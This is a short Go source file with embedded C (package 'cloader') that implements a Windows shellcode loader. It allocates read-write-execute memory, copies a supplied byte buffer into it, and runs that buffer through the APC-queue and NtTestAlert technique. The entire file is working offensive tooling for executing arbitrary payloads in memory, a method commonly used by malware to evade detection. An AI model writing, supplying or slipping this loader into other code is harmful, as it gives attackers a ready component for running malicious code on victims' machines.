package cloader

/*
#include <windows.h>

typedef NTSTATUS (NTAPI *pNtTestAlert)();
pNtTestAlert NtTestAlert = NULL;  // Initialize as NULL

void initializeNtTestAlert() {
    NtTestAlert = (pNtTestAlert)(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtTestAlert"));
}

void ntTestAlert(uintptr_t p, int len) {
    LPVOID Memory = VirtualAlloc(NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(Memory, (void*)p, len);

    // Ensure NtTestAlert is initialized
    if (NtTestAlert == NULL) {
        initializeNtTestAlert();
    }

    PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)Memory;
    QueueUserAPC((PAPCFUNC)apcRoutine, GetCurrentThread(), 0);
    if (NtTestAlert != NULL) {
        NtTestAlert();
    }
}

*/
import "C"
import "unsafe"

func NtTestAlert(p []byte) {
	C.initializeNtTestAlert()
	C.ntTestAlert((C.uintptr_t)(uintptr(unsafe.Pointer(&p[0]))), (C.int)(len(p)))
}
